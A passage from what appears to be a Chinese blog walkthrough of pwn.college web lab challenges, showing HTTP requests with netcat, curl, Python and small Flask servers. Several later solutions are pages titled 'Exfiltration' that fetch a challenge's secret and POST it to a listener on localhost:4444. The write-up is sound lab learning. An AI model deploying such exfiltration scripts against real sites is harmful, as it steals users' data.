<h4 id="18-HTTP-Forms-netcat"><a href="#18-HTTP-Forms-netcat" class="headerlink" title="18. HTTP Forms (netcat)"></a>18. HTTP Forms (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-forms-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>POST /check HTTP/1.1<br>Host: challenge.localhost:80<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br><br>private%5Fkey=bxildsjt<br>HTTP/1.1 200 OK<br></code></pre></td></tr></table></figure>

<p>这里有一个很坑的点，必须得有<code>Content-Length</code>字段，且有这个字段后，就可以回车再回车。此时接收表单数据。再进行url编码。</p>
<h4 id="19-HTTP-Forms-python"><a href="#19-HTTP-Forms-python" class="headerlink" title="19. HTTP Forms (python)"></a>19. HTTP Forms (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/progress&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;cboboidk&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox/2.0.0.11&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<h4 id="20-HTTP-Forms-Without-Forms"><a href="#20-HTTP-Forms-Without-Forms" class="headerlink" title="20. HTTP Forms Without Forms"></a>20. HTTP Forms Without Forms</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/verify&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;auth_key&quot;</span>: <span class="hljs-string">&quot;hhyrdgcr&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox/2.0.0.11&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<h4 id="21-Multiple-Form-Fields-curl"><a href="#21-Multiple-Form-Fields-curl" class="headerlink" title="21. Multiple Form Fields (curl)"></a>21. Multiple Form Fields (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-form-fields-curl:~/Desktop$ curl -X POST -d <span class="hljs-string">&quot;private_key=iqzryxmm&amp;secret_key=ufaeulmp&amp;secure_key=fgynzsij&quot;</span> -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/qualify<br></code></pre></td></tr></table></figure>

<h4 id="22-Multiple-Form-Fields-netcat"><a href="#22-Multiple-Form-Fields-netcat" class="headerlink" title="22. Multiple Form Fields (netcat)"></a>22. Multiple Form Fields (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-form-fields-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>POST /submission HTTP/1.1<br>Host: challenge.localhost:80<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 70<br><br>authcode=gzevumwe&amp;password=zcfrbrpt&amp;verify=wpbxshiv&amp;signature=ktkceqld<br></code></pre></td></tr></table></figure>

<p>同理，参数也用<code>&amp;</code>连接即可。</p>
<h4 id="23-HTTP-Redirects-netcat"><a href="#23-HTTP-Redirects-netcat" class="headerlink" title="23. HTTP Redirects (netcat)"></a>23. HTTP Redirects (netcat)</h4><p>重定向，首先先发送正常的请求。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET / HTTP/1.1<br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure>

<p>发现返回数据中，有重定向的paths，那么再用nc发送这个paths的请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-redirects-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /eFsriunp-hack HTTP/1.1             <br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure>

<h4 id="24-HTTP-Redirects-curl"><a href="#24-HTTP-Redirects-curl" class="headerlink" title="24. HTTP Redirects (curl)"></a>24. HTTP Redirects (curl)</h4><p>同理，用curl两次即可。</p>
<h4 id="25-HTTP-Redirects-python"><a href="#25-HTTP-Redirects-python" class="headerlink" title="25. HTTP Redirects (python)"></a>25. HTTP Redirects (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<p>python的requests模块能够自动跟踪重定向的网页，因此发送简单的GET请求即可。</p>
<h4 id="26-HTTP-Cookies-curl"><a href="#26-HTTP-Cookies-curl" class="headerlink" title="26. HTTP Cookies (curl)"></a>26. HTTP Cookies (curl)</h4><blockquote>
<p>Make an HTTP request to 127.0.0.1 on port 80 to get the flag. Make any HTTP request, and the server will ask you to set a cookie. Make another request with that cookie to get the flag.</p>
</blockquote>
<p>提示得很清楚了，先随便发送一个请求，然后设置cookie，随后发送另一个请求拿到flag。</p>
<p>可以使用<code>curl -L -v challenge.localhost</code>来自动跟踪重定向</p>
<p>第一次是为了拿到cookie，命令为<code>curl -L -v 127.0.0.1:80</code>，随后再curl一次，用<code>-b</code>参数携带cookie。然后就能获得flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-cookies-curl:~/Desktop$ curl -L -v -b <span class="hljs-string">&quot;cookie=3bfab8c85fbf73872c0b0a6956fc4620&quot;</span> 127.0.0.1:80<br></code></pre></td></tr></table></figure>

<h4 id="27-HTTP-Cookies-netcat"><a href="#27-HTTP-Cookies-netcat" class="headerlink" title="27. HTTP Cookies (netcat)"></a>27. HTTP Cookies (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-cookies-netcat:~/Desktop$ nc -v 127.0.01 80<br>Connection to 127.0.01 80 port [tcp/http] succeeded!<br>GET / HTTP/1.1<br>Cookie: cookie=38c5a3fa82c7a07c9acd13244c494a59 <br></code></pre></td></tr></table></figure>

<h4 id="28-HTTP-Cookies-python"><a href="#28-HTTP-Cookies-python" class="headerlink" title="28. HTTP Cookies (python)"></a>28. HTTP Cookies (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<h4 id="29-Server-State-python"><a href="#29-Server-State-python" class="headerlink" title="29. Server State (python)"></a>29. Server State (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250303120441856.png" srcset="/img/loading.gif" lazyload class="" title="image-20250303120441856">

<p>得益于，requests模块的get请求会自动跟踪重定向，因此执行一次脚本发现302重定向，会自动跟踪。则自动发送了4个请求，达到题目要求，获得flag。</p>
<h4 id="30-Listening-Web"><a href="#30-Listening-Web" class="headerlink" title="30. Listening Web"></a>30. Listening Web</h4><p>把第一关的Server代码copy到这儿，然后修改端口并运行即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<br><br>app.secret_key = os.urandom(<span class="hljs-number">8</span>)<br>app.run(<span class="hljs-string">&quot;challenge.localhost&quot;</span>, <span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure>

<h4 id="31-Speaking-Redirects"><a href="#31-Speaking-Redirects" class="headerlink" title="31. Speaking Redirects"></a>31. Speaking Redirects</h4><p>写Server端的重定向即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redirector</span>():<br>    <span class="hljs-keyword">return</span> flask.redirect(<span class="hljs-string">f&quot;http://challenge.localhost:80/submission&quot;</span>)<br><br>app.secret_key = os.urandom(<span class="hljs-number">8</span>)<br>app.run(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure>

<h4 id="32-JavaScript-Redirects"><a href="#32-JavaScript-Redirects" class="headerlink" title="32. JavaScript Redirects"></a>32. JavaScript Redirects</h4><p>写一个JavaScript代码，放在<code>/home/hacker/public_html/solve.html</code>中即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Redirecting...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;http://challenge.localhost:80/request&quot;</span>;</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="33-Including-JavaScript"><a href="#33-Including-JavaScript" class="headerlink" title="33. Including JavaScript"></a>33. Including JavaScript</h4><p>这道题的思路是，首先客户端请求<code>solve.html</code>，我们在其中写入javascript脚本，让其访问服务器指定paths的javascript脚本并执行，随后将该执行结果重定向到某个能看到的地方即可。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://challenge.localhost/mission&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;http://challenge.localhost:80/?flag=&quot;</span> + flag;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>javascript中的src属性：</p>
<p>当JavaScript的<code>&lt;scirpt&gt;</code>标签的src属性指定一个URL时，浏览器会发送一个HTTP GET请求到指定的URL，请求相应资源。获取资源（一般是javascript文件）后会下载JavaScript文件，解析并执行其中的JavaScript代码。</p>
</blockquote>
<h4 id="34-HTTP-javascript"><a href="#34-HTTP-javascript" class="headerlink" title="34. HTTP (javascript)"></a>34. HTTP (javascript)</h4><p>这道题真坑哇，这和那个CORS没关系。也不需要启动浏览器调试，也调试不了。得开practice模式调试。思路就是，直接使用fetch目标，然后对拿到的data做处理，让它发送给一个其他服务器就好了。我用的是nc -l 4444，监听4444端口。然后那边用POST提交数据就OK了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/task&#x27;</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="35-HTTP-Get-Parameters-javascript"><a href="#35-HTTP-Get-Parameters-javascript" class="headerlink" title="35. HTTP Get Parameters (javascript)"></a>35. HTTP Get Parameters (javascript)</h4><p>加参数而已，只需要在fetch里直接加。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/complete?challenge_key=vjcopwsk&amp;secure_key=zqzbftms&amp;auth=yzcibfla&#x27;</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<h4 id="36-HTTP-Forms-javascript"><a href="#36-HTTP-Forms-javascript" class="headerlink" title="36. HTTP Forms (javascript)"></a>36. HTTP Forms (javascript)</h4><p>查一下，fetch如何发送POST请求时加参数就好了。思路清晰后，就是语法的问题，AI的出现让这些问题都不是问题。所以重要的是思路。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Exfiltration<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>();</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;auth_pass&#x27;</span>,<span class="hljs-string">&#x27;hvapqzli&#x27;</span>);</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;solution&#x27;</span>, <span class="hljs-string">&#x27;kmdajdmm&#x27;</span>);</span><br><span class="language-javascript">        params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;security_token&#x27;</span>, <span class="hljs-string">&#x27;zprqxfbr&#x27;</span>);</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://challenge.localhost:80/submission&#x27;</span>,&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">body</span>: params,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(!response.<span class="hljs-property">ok</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">website_content</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Content received from challenge.localhost:80:&quot;</span>, website_content);</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:4444/&quot;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span 